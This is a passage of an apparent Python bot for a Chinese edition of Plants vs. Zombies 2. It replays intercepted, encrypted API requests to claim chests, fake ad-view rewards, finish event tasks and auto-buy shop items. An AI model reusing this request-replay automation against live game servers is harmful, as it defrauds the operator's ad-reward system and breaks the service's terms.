        elif response_data.get("r") == 0:
            print("庭院分享成功")
        else:
            print("庭院分享失败")
        data ={"req": "V733", "e": {"id": "37185868", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("庭院打开成功")
        else:
            print("庭院打开失败")
        data = {"req": "V721", "e": {"f": "0", "id": "37185868", "pi": pi, "s": "56", "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("庭院游玩成功")
            cur = decrypted_json['e']['d']['cur']
            max_val = decrypted_json['e']['d']['max']
            if cur == max_val:
                print("游玩币已上限")
            else:
                difference = max_val - cur
                result = difference // 6
                for i in range(result):
                    data ={"req": "V733", "e": {"id": "37185868", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("庭院打开成功")
                    else:
                        print("庭院打开失败")
                    data = {"req": "V721", "e": {"f": "0", "id": "37185868", "pi": pi, "s": "56", "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("庭院游玩成功")
                    else:
                        print("庭院游玩失败")
        else:
            print("庭院游玩失败")
        data = {"req": "V303", "e": {"al": [{"id": 10614, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("宝箱刷新成功")
        else:
            print("宝藏刷新失败")
        for i in range(2):
            data = {"req": "V313", "e": {"ad": "1", "f": "2", "lt": "1", "n": "1", "pi": pi, "sk": sk, "t": "3", "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            r_value = decrypted_json.get('r', None)
            if r_value != 0:
                print("每日金箱领取失败")
            else:
                print("每日金箱领取成功")
                gifts = decrypted_json['e']['d'].get('bl', [])
                for gift in gifts:
                    i_value = str(gift.get('i', ""))
                    q_value = gift.get('q', 0)
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的植物为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
        for i in range(2):
            data = {"req": "V313", "e": {"ad": "0", "f": "2", "lt": "1", "n": "10", "pi": pi, "sk": sk, "t": 0+i+1, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            r_value = decrypted_json.get('r', None)
            if r_value != 0:
                print("每日紫箱白箱领取失败")
            else:
                print("每日紫箱白箱领取成功")
                gifts = decrypted_json['e']['d'].get('bl', [])
                for gift in gifts:
                    i_value = str(gift.get('i', ""))
                    q_value = gift.get('q', 0)
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的植物为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
        data = {"req": "V313", "e": {"ad": "0", "f": "2", "lt": "1", "n": "10", "pi": pi, "sk": sk, "t": "4", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        r_value = decrypted_json.get('r', None)
        if r_value != 0:
            print("每日装扮箱领取失败")
        else:
            print("每日装扮箱领取成功")
            gifts = decrypted_json['e']['d'].get('bl', [])
            for gift in gifts:
                i_value = str(gift.get('i', ""))
                q_value = gift.get('q', 0)
                plant_info = formatted_plant.get(
                    i_value,
                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                print(f"获得的植物为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
        for i in range(3):
            data = {"req": "V790", "e": {"pi": pi, "sk": sk, "t": "2", "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("原木金箱子成功")
            else:
                print("原木金箱子失败")
                break
        gg_list = [3,23]
        for id in gg_list:
            for i in range(3):
                data =  {"req": "V765", "e": {"id": id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("日常广告成功")
                else:
                    print("日常广告失败")
                    break
        data =  {"req":"V303","e":{"al":[{"id":10704,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("超Z打开成功")
        else:
            print("超Z打开失败")
        data =  {"req": "V765", "e": {"id": "4", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("超Z钥匙看广告成功")
        else:
            print("超Z钥匙看广告失败")
        for i in range(5):
            data =  {"req": "V765", "e": {"id": "1", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            if response_data.get("r") == 10201:
                print("每日钻石广告已被获取")
                break
            elif response_data.get("r") == 0:
                print("每日钻石看广告成功")
            else:
                print("每日钻石看广告失败")
                break
        data = {"req":"V303","e":{"al":[{"id":10851,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("令营刷新成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
            elif op_value == 1:
                activity = decrypted_json['e']['d'][0]
                st = activity['st']
                et = activity['et']
                current_timestamp = time.time()
                local_time = time.localtime()
                current_year = local_time.tm_year
                current_month = local_time.tm_mon
                current_day = local_time.tm_mday
                current_date = current_year * 10000 + current_month * 100 + current_day
                if st <= current_date <= et:
                    inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
                    task_values = inner_data.get('task_list', [])
                    ri_list = []
                    zhou_list = []
                    xianding_list = []
                    for i, task_dict in enumerate(task_values):
                        for key, value in task_dict.items():
                            if value != 1:
                                if i == 0:
                                    ri_list.append(key)
                                elif i == 1:
                                    zhou_list.append(key)
                                elif i == 2:
                                    xianding_list.append(key)
                    for ti in ri_list:
                        data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"0","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("令营日任务领取成功")
                        else:
                            print("令营日任务领取失败")
                    for ti in zhou_list:
                        data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"1","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("令营周任务领取成功")
                        else:
                            print("令营周任务领取失败")
                    for ti in xianding_list:
                        data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"2","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("令营限定任务领取成功")
                        else:
                            print("令营限定任务领取失败")
                    data = {"req": "V1105", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("令营奖励领取成功")
                    else:
                        print("令营奖励领取失败")
                else:
                    print("活动时间已到期")
        else:
            print("令营刷新失败")
        data = {"req": "V303", "e": {"al": [{"id": 10821, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("雕像活动刷新成功")
        else:
            print("雕像活动刷新失败")
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            pi, ui, sk = get_pi_sk(加密)
            for i in range(3):
                data ={"req": "V221", "e": {"ai": "10762", "pi": pi, "rv": "5", "sk": sk, "t": "9", "ui": ui, "ver_": 版本号}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("雕像领取成功")
                else:
                    print("雕像领取失败")
            data = {"req": "V792", "e": {"ai": "10821", "pi": pi, "sk": sk, "t": "2", "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("袜子领取成功")
            else:
                print("袜子领取失败")
            data = {"req": "V303", "e": {"al": [{"id": 10821, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("雕像活动刷新成功")
            else:
                print("雕像活动刷新失败")
            data = {"req": "V938", "e": {"n": "1", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("奖励抽取成功")
            else:
                print("奖励抽取失败")
        data = {"req": "V303", "e": {"al": [{"id": 10889, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": "com.popcap.pvz2cthdbl", "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("宝箱刷新成功")
        else:
            print("宝箱刷新失败")
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data_str = decrypted_json['e']['d'][0]['data']
            data_dict = json.loads(data_str)
            task_list_in_data = data_dict.get('task', [])
            task_list = []
            for task in task_list_in_data:
                status = task.get('status')
                task_id = task.get('taskId')
                if status != 1:
                    task_list.append(task_id)
            for ti in task_list:
                data = {"req": "V507", "e": {"pi": pi, "sk": sk, "t": ti, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                r_value = decrypted_json.get('r', None)
                if r_value != 0:
                    print("幸运宝箱领取失败")
                else:
                    print("幸运宝箱领取成功")
                    gifts = decrypted_json['e']['d']['gift']
                    for gift_group in gifts:
                        for gift in gift_group:
                            i_value = str(gift.get('i', ""))
                            q_value = gift.get('q', 0)
                            plant_info = formatted_plant.get(
                                i_value,
                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                            )
                            plant_name = plant_info["name"]
                            plant_pinzhi = plant_info["pinzhi"]
                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                            print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
        data = {"req": "V402", "e": {"am": "30", "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
             print("30累冲领取成功")
        else:
             print("30累冲领取失败")
        time.sleep(0)
        data = {"req":"V971","e":{"bn":"2","gl":"1","pi":pi,"r":"0","sk":sk,"tgt":"0,1,2","tp":"1","ui":ui,"wi":"1"},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
             print("礼盒领取成功")
        else:
             print("礼盒领取失败")
        time.sleep(0)
        data = {"req": "V222", "e": {"p": {}, "pi": pi, "rv": "5", "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        json_str = decrypted_json['e']['d']['j']
        parsed_data = json.loads(json_str)
        sis_content = parsed_data.get('sis', [])
        gold_ids = []
        for item in sis_content:
             if item.get('pt') == 'gold':
                gold_ids.append(item.get('id'))
        for id in gold_ids:
             data = {"req": "V222", "e": {"p": {"id": id}, "pi": pi, "rv": "5", "sk": sk, "t": "3", "ui": ui}, "ev": 3}
             encrypted_data, head = get_encrypted_data(data, url)
             response = _do_post(head, encrypted_data, data)
             response_data = json.loads(response.text)
             if response_data.get("r") == 0:
                print("潘妮黑店购买成功")
             else:
                print("潘妮黑店购买失败")

        data = {"req": "V303", "e": {"al": [{"id": 10861, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0","pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("令营刷新成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
            elif op_value == 1:
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
                day_task_list = inner_data["day_task_list"]
                ri_list = []
                for key, value in day_task_list.items():
                    if value != 1:
                        ri_list.append(key)
                for ti in ri_list:
                    data = {"req": "V857", "e": {"pi": pi, "sk": sk, "ti": ti, "type": "0", "ui": ui, "wi": "0"}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    decrypted_response = get_decrypted_data(url, data=response)
                    decrypted_json = json.loads(decrypted_response)
                    r_value = decrypted_json.get('r', None)
                    if r_value != 0:
                        print("双人每日宝箱领取失败")
                    else:
                        print("双人每日宝箱领取成功")
                        gifts = decrypted_json['e']['d'].get('bl', [])
                        for gift in gifts:
                            i_value = str(gift.get('i', ""))
                            q_value = gift.get('q', 0)
                            plant_info = formatted_plant.get(
                                i_value,
                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                            )
                            plant_name = plant_info["name"]
                            plant_pinzhi = plant_info["pinzhi"]
                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                            print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
                data ={"req": "V1100", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("双人奖励领取成功")
                else:
                    print("双人奖励领取失败")
                time.sleep(0)
        data = {"req": "V303", "e": {"al": [{"id": 10859, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("双人状态更新成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
            elif op_value == 1:
                zb_lt = json.loads(decrypted_json["e"]["d"][0]["data"])
                zbl_list = zb_lt.get('zombiesData')
                list_data = zbl_list['list']
                chip_data = zbl_list['chip']
                lv_map = {}
                for item in list_data:
                    new_i = int(item['i']) + 4000
                    lv_map[new_i] = item['lv']
                for item in chip_data:
                    i_val = item['i']
                    if i_val in lv_map:
                        item['lv'] = lv_map[i_val]
                    else:
                        item['lv'] = 0
                item_404018 = None
                item_404072 = None
                for item in chip_data:
                    if int(item['i']) == 404018:
                        item_404018 = item
                    if int(item['i']) == 404072:
                        item_404072 = item
                output_list = []
                if item_404018 is not None and item_404072 is not None:
                    lv1 = item_404018['lv']
                    q1 = item_404018['q']
                    lv2 = item_404072['lv']
                    q2 = item_404072['q']
                    if (lv1 == 0 and lv2 == 0 and q1 >= 700 and q2 >= 700) or (lv1 >= 8 and lv2 >= 8):
                        output_list = [404010, 404029, 404047, 404016, 404007]
                    else:
                        if (0 < lv1 < 7) or (lv1 == 7 and q1 < 300) or (lv1 == 0 and q1 < 700):
                            output_list.append(404018)
                        if (0 < lv2 < 7) or (lv2 == 7 and q2 < 300) or (lv2 == 0 and q2 < 700):
                            output_list.append(404072)
                data = {"req":"V835","e":{"c":"0","pi":pi,"s":"1","sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                shop_items = decrypted_json['e']['d']['shopItems']
                shop_list = []
                found_any = False
                for idx, item in enumerate(shop_items):
                    obj_id = item.get('objId')
                    price_value = item.get('price')
                    if obj_id in output_list:
                        found_any = True
                        limit = item.get('limit', 0)
                        times = item.get('times', 0)
                        ti_value = limit - times
                        shop_dict = {"i": str(obj_id),"gi": idx,"ti": ti_value,"ci": price_value}
                        shop_list.append(shop_dict)
                if found_any:
                    item_mapping = {
                        404018: "飞行器",
                        404007: "铜人",
                        404010: "冰鼬",
                        404016: "魔法师",
                        404029: "辣椒",
                        404047: "火把武僧",
                        404072: "遗迹猎人"
                    }
                    for item in shop_list:
                        i = int(item.get('i'))
                        idx = item.get('idx')
                        ti = item.get('ti')
                        ci = item.get('ci')
                        gi = item.get('gi')
                        if ti is None or ci is None:
                            print(f"跳过一项，因为缺少 ti 或 ci: {item}")
                            continue
                        item_name = item_mapping.get(i, str(i))
                        message_dict = {"req":"V392","e":{"ci":"6","gi":gi,"mi":"23243","pi":pi,"q":"1","si":"14","sk":sk,"ui":ui},"ev":3}
                        for _ in range(int(ti)):
                            encrypted_data, head = get_encrypted_data(message_dict, url)
                            response = _do_post(head, encrypted_data, message_dict)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print(f"{item_name}购买成功")
                            else:
                                print("{item_name}购买失败")
                                break
                else:
                    print("今日暂无优质紫卡，自动购买商店僵尸")
                    for idx, item in enumerate(shop_items):
                        obj_id = item.get('objId')
                        # 只购买僵尸类物品（ID在404000-404999范围内）
                        if not (404000 <= obj_id <= 404999):
                            continue
                        price_value = item.get('price')
                        limit = item.get('limit', 0)
                        times = item.get('times', 0)
                        ti_value = limit - times
                        if ti_value <= 0:
                            continue
                        item_name = formatted_plant.get(str(obj_id), {}).get("name", f"僵尸{obj_id}")
                        message_dict = {"req":"V392","e":{"ci":"6","gi":idx,"mi":"23243","pi":pi,"q":"1","si":"14","sk":sk,"ui":ui},"ev":3}
                        for _ in range(int(ti_value)):
                            encrypted_data, head = get_encrypted_data(message_dict, url)
                            response = _do_post(head, encrypted_data, message_dict)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print(f"{item_name}购买成功")
                            else:
                                print(f"{item_name}购买失败")
                                break
        else:
            print("双人状态更新失败")
        time.sleep(0)
    except KeyError as _e:
        print(f"{C.Y}7天签到响应解析出错: {_e}，跳过{C.R}")
def sptuoz():
    pi, ui, sk = get_pi_sk(加密)
    zhiwutanxian()
    print(f"\n探险上限为1的植物有:")
    plants1 = [ "1.豌豆射手","2.卷心菜","3.向日葵","4.玉米投手","5.地刺","6.弹簧豆","7.双向射手","8.巴豆","10.火葫芦","11.白萝卜","12.土豆地雷","13.坚果","14.冰冻生菜","16.磁力菇","17.缠绕水草","18.[38;5;33m鳄梨[0m","21.[38;5;46m漩涡枇杷[0m","22.[38;5;46m电离红掌[0m","24.[38;5;46m菠萝蜜[0m","26.[38;5;46m复活萝卜[0m","28.[38;5;46m香水蘑菇[0m","32.[38;5;46m月光花[0m","34.[38;5;135m莲藕射手[0m","35.[38;5;46m冬瓜守卫[0m","37.[38;5;46m石斛防风网[0m","39.[38;5;33m海蘑菇[0m","41.[38;5;135m宇宙豌豆[0m","42.[38;5;46m重力树[0m"]
    plants2 = ["9.[38;5;46m闪电芦苇[0m","15.大喷菇", "19.[38;5;46m火焰豌豆[0m","20.[38;5;46m旋转芜菁[0m","23.[38;5;33m红针花[0m","25.[38;5;33m潜伏芹菜[0m","27.[38;5;33m原始豌豆射手[0m","31.[38;5;33m毒影菇[0m","33.[38;5;33m番莲工程师[0m","36.[38;5;135m芦荟医师[0m","38.[38;5;33m千金藤[0m","40.[38;5;46m噗噗鱼藤[0m"]
    print_in_columns(plants1, num_columns=4, column_spacing=2)
    print(f"\n探险上限为2的植物有:")
    print_in_columns(plants2, num_columns=4, column_spacing=2)
    wi_vl = input("\n请输入探险植物序号(回车自动选未满阶):")
    if wi_vl == "":
        level_dict = get_plant_levels()
        探险序号映射 = {1:"1101",2:"1105",3:"1102",4:"1121",5:"1111",6:"1110",7:"1116",8:"1115",9:"1122",10:"1134",11:"1135",12:"1104",13:"1103",14:"1106",15:"1150",16:"1155",17:"1166",18:"1168",19:"1178",20:"1183",21:"1189",22:"1190",23:"111109",24:"111114",25:"111125",26:"111128",27:"111135",28:"111137",31:"111151",32:"111152",33:"111168",34:"111166",35:"111191",36:"111189",37:"22000180",38:"22000160",39:"22001360",40:"22001370",41:"22001830",42:"22001860"}
        探险序号名称 = {1:"豌豆射手",2:"卷心菜",3:"向日葵",4:"玉米投手",5:"地刺",6:"弹簧豆",7:"双向射手",8:"巴豆",9:"闪电芦苇",10:"火葫芦",11:"白萝卜",12:"土豆地雷",13:"坚果",14:"冰冻生菜",15:"大喷菇",16:"磁力菇",17:"缠绕水草",18:"鳄梨",19:"火焰豌豆",20:"旋转芜菁",21:"漩涡枇杷",22:"电离红掌",23:"红针花",24:"菠萝蜜",25:"潜伏芹菜",26:"复活萝卜",27:"原始豌豆射手",28:"香水蘑菇",31:"毒影菇",32:"月光花",33:"番莲工程师",34:"莲藕射手",35:"冬瓜守卫",36:"芦荟医师",37:"石斛防风网",38:"千金藤",39:"海蘑菇",40:"噗噗鱼藤",41:"宇宙豌豆",42:"重力树"}
        selected = None
        for seq in sorted(探险序号映射.keys()):
            item_id = 探险序号映射[seq]
            current_level = level_dict.get(item_id, 0)
            max_jieshu = get_max_jieshu(item_id)
            if current_level < max_jieshu:
                selected = seq
                break
        if selected is not None:
            wi_vl = str(selected)
            print("自动选择未满阶植物: " + str(selected) + "." + 探险序号名称[selected] + " (当前" + str(level_dict.get(探险序号映射[selected],0)+1) + "阶)")
        else:
            print("所有探险植物已满阶")
            return
    wi_value = int(wi_vl)+10426
    specified_values = {10435, 10441, 10445, 10446, 10449, 10451, 10453, 10457, 10459, 10462, 10464, 10466}
    is_specified = wi_value in specified_values
    run_second_script(wi_value,is_specified)
def run_second_script(wi_value,is_specified):
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10808, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("探险刷新成功")
    else:
        print("探险刷新失败")
    time.sleep(0)
    data = {"req": "V279", "e": { "pi":pi, "sk": sk,  "ui":ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("探险刷新成功")
    else:
        print("探险刷新失败")
    time.sleep(0)
    data = {"req":"V282","e":{"f":"7","is":"0","pi":pi,"sk":sk,"ui":ui,"wi":wi_value},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("探险加次数成功")
    else:
        print("探险加次数失败")
    time.sleep(0)
    for j in range(3):
        d_value = None
        while True:
            data = {"req": "V280", "e": { "pi":pi, "sk": sk,  "ui":ui, "wi": wi_value}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
